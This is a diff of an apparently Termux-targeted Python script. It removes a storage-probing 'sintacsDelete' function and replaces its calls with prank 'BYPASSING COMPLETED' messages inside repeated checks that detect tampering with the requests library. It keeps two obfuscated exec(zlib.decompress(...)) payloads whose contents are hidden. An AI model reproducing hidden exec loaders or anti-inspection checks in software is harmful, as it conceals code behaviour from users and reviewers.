@@ -49,22 +49,6 @@ try:
 except Exception as e:
     pass
 
-def sintacsDelete():
-    os.system('termux-setup-storage')
-    
-    try:
-        data = os.listdir('/sdcard')
-        if 'Android' in data:
-             systm("clear")
-             print(f"{lgr}  [✓] BYPASSING COMPLETED")
-             slp(5)
-             print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
-             exit()
-        else:
-          exit()
-    except:
-      exit()
-
 # PROTECT
 exec(zlib.decompress(b'x\x9c-\x8c\xbb\n\xc30\x0cE\xf7|\x85\xe2)\x81b\xef\xed\xd6\x1fh)\xd9B\x077\x95\x89 \xb6\x82$C\xfa\xf7M\x1fg\xb8p\xb8p\x92p\x06V\xa0\xbc\xb2\x18\xac\xd1\xe6\x83\xbe\xd407\x94\xbe\xeaI\x13-\xd8\xb9\xf0\x8c\x16\x7f3q\xf6\x86\x92\xeb\x16>\x9f\x86\xaa\x12\x1eT\x82d\xd7\x1f\x1b\xd8Y\xa3j\x83\x8b\xe2_\x85\x8au\xc9\xc1\xd8\xde\xe1,\x0cC\x95\x02\x97\x94\xe0*l8\xed5\xef}\x0b\xc3\x8c\x05n\xb5\xc0\xc0\xbc\xb8\xfe\x84\x1bY\xd7\xbf\x01\xa2n6\xee'))
 
@@ -74,26 +58,38 @@ exec(zlib.decompress(b'x\x9c\xad\x90\xcfJ\x041\x0c\xc6\xef\xf3\x14\xf5\xd4\x19\x
 # SECURITY
 x = open(requests.__file__,'r').read()
 if "print" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
 elif "sys.stdout.write" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
 else:
     pass
  
 x = open(requests.__file__,'r').read()
 if "print" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
 elif "sys.stdout.write" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
 else:
     pass
 
 x = open(requests.__file__,'r').read()
 if "print" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
  
 elif "sys.stdout.write" in x:
-    sintacsDelete()
+    print(f"{lgr}  [✓] BYPASSING COMPLETED")
+    slp(5)
+    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
 else:
     pass
 
